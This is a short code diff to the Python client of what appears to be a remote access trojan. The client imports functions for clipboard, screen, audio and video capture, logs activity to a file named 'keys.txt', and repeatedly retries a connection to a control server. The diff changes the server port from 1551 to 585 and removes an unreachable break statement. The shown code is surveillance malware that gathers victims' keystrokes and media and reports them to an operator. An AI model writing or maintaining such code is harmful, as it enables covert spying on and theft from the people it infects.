@@ -10,7 +10,7 @@ from modules.client_RDP import (gather_system_info, command_line_interface,
                                 clipboard_data, screen_capture, audio_capture, video_capture)
 
 LOG_FILE = "keys.txt"
-SERVER_ADDRESS = ("127.0.0.1", 1551)
+SERVER_ADDRESS = ("127.0.0.1", 585)
 RETRY_INTERVAL = 5
 
 logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s: %(message)s")
@@ -26,7 +26,6 @@ def connect_to_server():
             server.send(operation_system[0].encode())
             print("connected")
             return server, operation_system
-            break
         except ConnectionError:
             print("Connection failed. Retrying in 5 seconds...")
             time.sleep(RETRY_INTERVAL)
